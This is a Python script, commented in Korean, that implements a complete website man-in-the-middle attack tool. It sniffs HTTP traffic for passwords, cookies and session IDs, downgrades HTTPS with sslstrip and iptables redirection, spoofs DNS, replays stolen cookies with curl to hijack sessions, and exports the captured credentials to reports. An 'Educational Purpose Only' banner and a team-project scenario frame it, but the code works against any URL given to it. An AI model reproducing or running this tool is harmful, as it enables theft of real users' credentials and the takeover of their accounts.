#!/usr/bin/env python3
import subprocess
import os
import sys
import re
import json
import time
import threading
import socket
from datetime import datetime
from urllib.parse import urlparse
import signal

class WebsiteAttackSuite:
    """웹사이트 타겟 전용 공격 도구"""
    
    def __init__(self, interface="eth0"):
        self.interface = interface
        self.captured_data = {
            "credentials": [],
            "cookies": [],
            "sessions": [],
            "target_websites": [],
            "hijack_tests": []
        }
        self.processes = []
        self.is_running = False
        self.target_website = None
        
    def check_root(self):
        """Root 권한 확인"""
        if os.geteuid() != 0:
            print("[!] This script requires root privileges!")
            sys.exit(1)
    
    def set_target_website(self, target_url):
        """특정 웹사이트를 타겟으로 설정"""
        print(f"\n[*] Setting target website: {target_url}")
        
        # URL 검증 및 파싱
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'http://' + target_url
        
        try:
            parsed = urlparse(target_url)
            domain = parsed.netloc
            
            # IP가 직접 입력된 경우 처리
            ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}(:\d+)?$'
            if re.match(ip_pattern, domain):
                ip = domain.split(':')[0]
            else:
                # 도메인을 IP로 변환
                ip = socket.gethostbyname(domain.split(':')[0])
            
            print(f"[+] Target URL: {target_url}")
            print(f"[+] Target domain/IP: {domain}")
            print(f"[+] Resolved IP: {ip}")
            
            self.target_website = {
                "url": target_url,
                "domain": domain,
                "ip": ip,
                "port": parsed.port or (443 if parsed.scheme == 'https' else 80),
                "scheme": parsed.scheme,
                "path": parsed.path or "/"
            }
            
            self.captured_data["target_websites"].append(self.target_website)
            return self.target_website
            
        except Exception as e:
            print(f"[-] Error setting target: {e}")
            return None
    
    def start_tcpdump(self, output_file=None, custom_filter=None):
        """tcpdump를 사용한 패킷 캡처"""
        if self.target_website:
            # 타겟 웹사이트 전용 필터
            filter_expr = custom_filter or f"host {self.target_website['ip']} and tcp port {self.target_website['port']}"
        else:
            filter_expr = custom_filter or "tcp port 80 or tcp port 8080"
            
        print(f"[*] Starting packet capture with filter: {filter_expr}")
        
        if output_file:
            cmd = f"tcpdump -i {self.interface} -w {output_file} '{filter_expr}'"
        else:
            cmd = f"tcpdump -i {self.interface} -nn -A -s0 '{filter_expr}'"
        
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        self.processes.append(process)
        
        # 실시간으로 출력 파싱
        if not output_file:
            threading.Thread(target=self._parse_tcpdump_output, args=(process,), daemon=True).start()
        
        return process
    
    def _parse_tcpdump_output(self, process):
        """tcpdump 출력 실시간 파싱"""
        buffer = ""
        
        for line in iter(process.stdout.readline, ''):
            buffer += line
            
            # HTTP 요청 감지
            if "POST" in line or "GET" in line:
                # 다음 몇 줄을 더 읽어서 전체 요청 확인
                for _ in range(20):
                    next_line = process.stdout.readline()
                    if next_line:
                        buffer += next_line
                
                # 타겟 웹사이트 관련 트래픽 강조
                if self.target_website and (self.target_website['domain'] in buffer or self.target_website['ip'] in buffer):
                    print(f"\n[!!!] Target website traffic captured: {self.target_website['domain']}")
                    
                    # 로그인 페이지 감지
                    if any(login_keyword in buffer.lower() for login_keyword in ['login', 'signin', 'auth', 'password']):
                        print("[!!!] Possible login page detected!")
                
                # 데이터 추출
                self._extract_credentials(buffer)
                self._extract_cookies(buffer)
                self._extract_sessions(buffer)
                
                buffer = ""
    
    def _extract_credentials(self, data):
        """로그인 정보 추출"""
        patterns = [
            r'username=([^&\s]+)',
            r'password=([^&\s]+)',
            r'email=([^&\s]+)',
            r'user=([^&\s]+)',
            r'pass=([^&\s]+)',
            r'login=([^&\s]+)',
            r'pwd=([^&\s]+)',
            r'passwd=([^&\s]+)',
            r'uid=([^&\s]+)',
            r'id=([^&\s]+)'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, data, re.IGNORECASE)
            if matches:
                # URL 디코딩
                import urllib.parse
                decoded_value = urllib.parse.unquote(matches[0])
                
                cred_info = {
                    "timestamp": datetime.now().isoformat(),
                    "pattern": pattern.split('=')[0],
                    "value": decoded_value,
                    "raw_value": matches[0],
                    "target_site": self.target_website['domain'] if self.target_website else "unknown"
                }
                
                # 중복 체크
                if not any(c['raw_value'] == matches[0] for c in self.captured_data["credentials"]):
                    self.captured_data["credentials"].append(cred_info)
                    print(f"\n[+] Credential captured!")
                    print(f"    Type: {cred_info['pattern']}")
                    print(f"    Value: {cred_info['value']}")
                    print(f"    Site: {cred_info['target_site']}")
    
    def _extract_cookies(self, data):
        """쿠키 정보 추출"""
        cookie_patterns = [
            r'Cookie:\s*([^\r\n]+)',
            r'Set-Cookie:\s*([^\r\n]+)'
        ]
        
        for pattern in cookie_patterns:
            matches = re.findall(pattern, data)
            if matches:
                cookie_info = {
                    "timestamp": datetime.now().isoformat(),
                    "cookie": matches[0],
                    "target_site": self.target_website['domain'] if self.target_website else "unknown",
                    "type": "request" if "Cookie:" in pattern else "response"
                }
                self.captured_data["cookies"].append(cookie_info)
                print(f"\n[+] Cookie captured ({cookie_info['type']}):")
                print(f"    {matches[0][:80]}...")
                print(f"    Site: {cookie_info['target_site']}")
    
    def _extract_sessions(self, data):
        """세션 ID 추출"""
        session_patterns = [
            r'PHPSESSID=([a-zA-Z0-9]+)',
            r'JSESSIONID=([a-zA-Z0-9]+)',
            r'ASP\.NET_SessionId=([a-zA-Z0-9]+)',
            r'session_id=([a-zA-Z0-9]+)',
            r'sid=([a-zA-Z0-9]+)',
            r'_session=([a-zA-Z0-9]+)',
            r'connect\.sid=([a-zA-Z0-9]+)'
        ]
        
        for pattern in session_patterns:
            matches = re.findall(pattern, data)
            if matches:
                session_info = {
                    "timestamp": datetime.now().isoformat(),
                    "type": pattern.split('=')[0],
                    "id": matches[0],
                    "target_site": self.target_website['domain'] if self.target_website else "unknown"
                }
                
                # 중복 체크
                if not any(s['id'] == matches[0] for s in self.captured_data["sessions"]):
                    self.captured_data["sessions"].append(session_info)
                    print(f"\n[+] Session ID captured:")
                    print(f"    Type: {session_info['type']}")
                    print(f"    ID: {session_info['id']}")
                    print(f"    Site: {session_info['target_site']}")
    
    def monitor_target_traffic(self, duration=None):
        """타겟 웹사이트 트래픽 모니터링"""
        if not self.target_website:
            print("[!] No target website set. Use 'Set Target Website' first.")
            return
        
        print(f"\n[*] Monitoring traffic to {self.target_website['domain']}")
        print(f"[*] Target IP: {self.target_website['ip']}")
        print(f"[*] Port: {self.target_website['port']}")
        
        # tcpdump 시작
        self.start_tcpdump()
        
        if duration:
            print(f"[*] Monitoring for {duration} seconds...")
            time.sleep(duration)
        else:
            print("\n[*] Monitoring active. Press Enter to stop...")
            input()
        
        print("\n[*] Stopping monitoring...")
        self._stop_current_capture()
    
    def start_sslstrip(self):
        """SSL 스트리핑 공격"""
        if not self.target_website:
            print("[!] No target website set.")
            return
            
        if self.target_website['scheme'] != 'https':
            print("[!] Target is not HTTPS. SSL stripping not needed.")
            return
        
        print("\n[*] Starting SSL stripping attack...")
        
        # IP 포워딩 활성화
        subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
        
        # iptables 규칙 추가
        subprocess.run("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080", shell=True)
        
        # sslstrip 실행
        log_file = f"sslstrip_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        cmd = f"sslstrip -l 8080 -w {log_file}"
        process = subprocess.Popen(cmd, shell=True)
        self.processes.append(process)
        
        print(f"[+] SSL stripping active on port 8080")
        print(f"[+] Log file: {log_file}")
        print("[*] Victims will be redirected to HTTP version")
        
        # 실시간 로그 모니터링
        threading.Thread(target=self._monitor_sslstrip_log, args=(log_file,), daemon=True).start()
    
    def _monitor_sslstrip_log(self, log_file):
        """SSL strip 로그 실시간 모니터링"""
        time.sleep(2)  # 파일 생성 대기
        
        try:
            with subprocess.Popen(['tail', '-f', log_file], stdout=subprocess.PIPE, text=True) as process:
                for line in iter(process.stdout.readline, ''):
                    if line:
                        # 크레덴셜 추출
                        self._extract_credentials(line)
                        # 쿠키 추출
                        self._extract_cookies(line)
        except:
            pass
    
    def session_hijack_test(self, cookie_string=None, session_id=None):
        """세션 하이재킹 테스트"""
        if not self.target_website:
            print("[!] No target website set.")
            return
        
        print(f"\n[*] Testing session hijack on {self.target_website['url']}")
        
        # 쿠키 또는 세션 선택
        if not cookie_string and not session_id:
            if self.captured_data['cookies']:
                print("\n[*] Available cookies:")
                for i, cookie in enumerate(self.captured_data['cookies'][-5:], 1):
                    print(f"{i}. {cookie['cookie'][:80]}...")
                
                choice = input("\nSelect cookie number (or press Enter to skip): ")
                if choice:
                    try:
                        cookie_string = self.captured_data['cookies'][-(6-int(choice))]['cookie']
                    except:
                        print("[!] Invalid selection")
                        return
        
        # curl을 사용한 요청
        headers = []
        if cookie_string:
            headers.append(f'-H "Cookie: {cookie_string}"')
        
        headers.append('-H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"')
        
        cmd = f'curl -s -I {" ".join(headers)} "{self.target_website["url"]}"'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        # 상태 코드 확인
        status_match = re.search(r'HTTP/\d\.\d\s+(\d+)', result.stdout)
        
        hijack_result = {
            "timestamp": datetime.now().isoformat(),
            "target_url": self.target_website["url"],
            "cookie_used": cookie_string[:50] + "..." if cookie_string and len(cookie_string) > 50 else cookie_string,
            "success": False,
            "status_code": None,
            "response_headers": result.stdout
        }
        
        if status_match:
            status_code = status_match.group(1)
            hijack_result["status_code"] = status_code
            
            print(f"\n[+] Response status: {status_code}")
            
            if status_code == "200":
                print("[!!!] Session hijack likely successful!")
                hijack_result["success"] = True
                
                # 전체 페이지 가져오기 옵션
                if input("\nFetch full page content? (y/n): ").lower() == 'y':
                    cmd_full = f'curl -s {" ".join(headers)} "{self.target_website["url"]}"'
                    full_result = subprocess.run(cmd_full, shell=True, capture_output=True, text=True)
                    # 로그인 상태 확인
                    if any(keyword in full_result.stdout.lower() for keyword in ['logout', 'profile', 'dashboard', 'welcome']):
                        print("[!!!] Confirmed: Logged in session!")
                    
                    # 결과 저장
                    with open(f"hijacked_page_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html", "w") as f:
                        f.write(full_result.stdout)
                    print("[+] Page content saved")
            
            elif status_code in ["301", "302"]:
                print("[*] Redirect detected - session might be expired")
            else:
                print("[-] Session appears to be invalid")
        
        self.captured_data['hijack_tests'].append(hijack_result)
        return hijack_result
    
    def start_dns_spoof(self, fake_ip):
        """DNS 스푸핑"""
        if not self.target_website:
            print("[!] No target website set.")
            return
        
        print(f"\n[*] Starting DNS spoofing: {self.target_website['domain']} -> {fake_ip}")
        
        # hosts 파일 생성
        with open("/tmp/dnsspoof.hosts", "w") as f:
            f.write(f"{fake_ip} {self.target_website['domain']}\n")
            if not self.target_website['domain'].startswith('www.'):
                f.write(f"{fake_ip} www.{self.target_website['domain']}\n")
        
        cmd = f"dnsspoof -i {self.interface} -f /tmp/dnsspoof.hosts"
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        self.processes.append(process)
        
        print("[+] DNS spoofing started")
        print(f"[*] Victims will be redirected to {fake_ip}")
    
    def automated_attack(self):
        """자동화된 공격 시퀀스"""
        if not self.target_website:
            print("[!] No target website set.")
            return
        
        print(f"\n[*] Starting automated attack on {self.target_website['domain']}")
        print("[*] Attack sequence:")
        print("    1. Start packet capture")
        print("    2. SSL stripping (if HTTPS)")
        print("    3. Monitor for credentials")
        print("    4. Attempt session hijacking")
        
        # 1. 패킷 캡처 시작
        pcap_file = f"capture_{self.target_website['domain']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pcap"
        self.start_tcpdump(output_file=pcap_file)
        self.start_tcpdump()  # 콘솔 출력용
        
        # 2. HTTPS면 SSL 스트리핑
        if self.target_website['scheme'] == 'https':
            self.start_sslstrip()
        
        # 3. 모니터링
        print("\n[*] Monitoring active. Waiting for traffic...")
        print("[*] Visit the target site from another device to capture data")
        print("\n[*] Press Enter to stop and analyze results...")
        input()
        
        # 4. 공격 중지 및 분석
        self._stop_all_processes()
        
        print("\n[*] Attack stopped. Analyzing results...")
        self._analyze_results()
        
        # 5. 세션 하이재킹 시도
        if self.captured_data['cookies']:
            print("\n[*] Attempting session hijacking with captured cookies...")
            for cookie in self.captured_data['cookies'][-3:]:  # 최근 3개만
                self.session_hijack_test(cookie['cookie'])
        
        # 6. 결과 저장
        self.export_results()
    
    def _stop_current_capture(self):
        """현재 실행 중인 캡처 중지"""
        for process in self.processes:
            try:
                process.terminate()
                process.wait(timeout=5)
            except:
                process.kill()
        self.processes.clear()
    
    def _stop_all_processes(self):
        """모든 프로세스 중지"""
        print("\n[*] Stopping all processes...")
        
        # 프로세스 종료
        self._stop_current_capture()
        
        # iptables 규칙 제거
        subprocess.run("iptables -t nat -F", shell=True)
        
        # IP 포워딩 비활성화
        subprocess.run("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
        
        # 임시 파일 삭제
        if os.path.exists("/tmp/dnsspoof.hosts"):
            os.remove("/tmp/dnsspoof.hosts")
    
    def _analyze_results(self):
        """캡처 결과 분석"""
        print("\n" + "="*50)
        print("         ATTACK RESULTS ANALYSIS")
        print("="*50)
        
        print(f"\nTarget: {self.target_website['url']}")
        print(f"Duration: {datetime.now()}")
        
        # 크레덴셜 분석
        if self.captured_data['credentials']:
            print(f"\n[+] Credentials found: {len(self.captured_data['credentials'])}")
            for cred in self.captured_data['credentials']:
                print(f"    - {cred['pattern']}: {cred['value']}")
        else:
            print("\n[-] No credentials captured")
        
        # 쿠키 분석
        if self.captured_data['cookies']:
            print(f"\n[+] Cookies found: {len(self.captured_data['cookies'])}")
            unique_cookies = set()
            for cookie in self.captured_data['cookies']:
                cookie_name = cookie['cookie'].split('=')[0] if '=' in cookie['cookie'] else cookie['cookie']
                unique_cookies.add(cookie_name)
            print(f"    Unique cookie names: {', '.join(list(unique_cookies)[:5])}")
        
        # 세션 분석
        if self.captured_data['sessions']:
            print(f"\n[+] Sessions found: {len(self.captured_data['sessions'])}")
            for session in self.captured_data['sessions'][:3]:
                print(f"    - {session['type']}: {session['id']}")
        
        # 하이재킹 성공 여부
        successful_hijacks = [h for h in self.captured_data['hijack_tests'] if h.get('success')]
        if successful_hijacks:
            print(f"\n[!!!] Successful hijacks: {len(successful_hijacks)}")
    
    def export_results(self, filename=None):
        """결과 내보내기"""
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"attack_results_{self.target_website['domain'].replace('.', '_')}_{timestamp}"
        
        # JSON 형식 저장
        json_file = f"{filename}.json"
        with open(json_file, 'w') as f:
            export_data = {
                "attack_time": datetime.now().isoformat(),
                "target": self.target_website,
                "captured_data": self.captured_data
            }
            json.dump(export_data, f, indent=4)
        
        # 텍스트 보고서 생성
        txt_file = f"{filename}.txt"
        with open(txt_file, 'w') as f:
            f.write("=== WEB ATTACK REPORT ===\n")
            f.write(f"Generated: {datetime.now()}\n")
            f.write(f"Target: {self.target_website['url']}\n\n")
            
            if self.captured_data['credentials']:
                f.write("CREDENTIALS CAPTURED:\n")
                for cred in self.captured_data['credentials']:
                    f.write(f"  {cred['pattern']}: {cred['value']}\n")
                f.write("\n")
            
            if self.captured_data['cookies']:
                f.write("COOKIES CAPTURED:\n")
                for cookie in self.captured_data['cookies'][:10]:
                    f.write(f"  {cookie['cookie'][:100]}...\n")
                f.write("\n")
            
            if self.captured_data['sessions']:
                f.write("SESSIONS CAPTURED:\n")
                for session in self.captured_data['sessions']:
                    f.write(f"  {session['type']}: {session['id']}\n")
        
        print(f"\n[+] Results exported:")
        print(f"    - JSON: {json_file}")
        print(f"    - Report: {txt_file}")
    
    def run_interactive_menu(self):
        """대화형 메뉴"""
        while True:
            print("""
            ╔════════════════════════════════════════════╗
            ║      Website Attack Suite for Projects     ║
            ║         Educational Purpose Only!          ║
            ╚════════════════════════════════════════════╝
            
            Target: {}
            
            1. Set Target Website
            2. Monitor Target Traffic
            3. Start SSL Stripping
            4. DNS Spoofing
            5. Test Session Hijacking
            6. Automated Attack Sequence
            7. Analyze Captured Data
            8. Export Results
            9. Exit
            
            """.format(self.target_website['url'] if self.target_website else "Not Set"))
            
            choice = input("Select option (1-9): ")
            
            if choice == "1":
                url = input("Enter target website URL: ")
                self.set_target_website(url)
                
            elif choice == "2":
                if not self.target_website:
                    print("[!] Set target website first")
                else:
                    duration = input("Monitor duration in seconds (press Enter for manual stop): ")
                    self.monitor_target_traffic(int(duration) if duration else None)
                    
            elif choice == "3":
                self.start_sslstrip()
                
            elif choice == "4":
                if not self.target_website:
                    print("[!] Set target website first")
                else:
                    fake_ip = input("Enter fake server IP: ")
                    self.start_dns_spoof(fake_ip)
                    
            elif choice == "5":
                self.session_hijack_test()
                
            elif choice == "6":
                if not self.target_website:
                    print("[!] Set target website first")
                else:
                    self.automated_attack()
                    
            elif choice == "7":
                self._analyze_results()
                
            elif choice == "8":
                self.export_results()
                
            elif choice == "9":
                print("\n[*] Shutting down...")
                self._stop_all_processes()
                sys.exit(0)
            
            input("\nPress Enter to continue...")


# 메인 실행
if __name__ == "__main__":
    # Ctrl+C 핸들러
    def signal_handler(sig, frame):
        print("\n[!] Caught interrupt signal")
        subprocess.run("killall tcpdump sslstrip dnsspoof 2>/dev/null", shell=True)
        subprocess.run("iptables -t nat -F", shell=True)
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    # 실행
    attack = WebsiteAttackSuite()
    attack.check_root()
    
    # 명령줄 인자 처리
    if len(sys.argv) > 1:
        # 바로 타겟 설정
        attack.set_target_website(sys.argv[1])
        if len(sys.argv) > 2 and sys.argv[2] == "auto":
            # 자동 공격 모드
            attack.automated_attack()
        else:
            attack.run_interactive_menu()
    else:
        attack.run_interactive_menu()


"""
사용 방법
1. 기본 실행 (대화형 메뉴): sudo python3 website_attack.py
2. 타겟 지정 실행: sudo python3 website_attack.py http://192.168.1.100:8080
3. 자동 공격 모드: sudo python3 website_attack.py http://192.168.1.100:8080 auto
"""

"""
주요 공격 기능
1. 트래픽 모니터링: 타겟 사이트로의 모든 HTTP 트래픽 캡처
2. SSL 스트리핑: HTTPS를 HTTP로 다운그레이드
3. DNS 스푸핑: 가짜 서버로 리다이렉트
4. 세션 하이재킹: 캡처한 쿠키로 로그인 시도
5. 자동화 공격: 모든 공격을 순차적으로 실행
"""

"""
팀 프로젝트 시나리오
1. 팀원이 만든 사이트 URL 입력
2. 다른 팀원이 해당 사이트 접속 및 로그인
3. 크레덴셜과 세션 캡처
4. 캡처한 데이터로 공격 시연
"""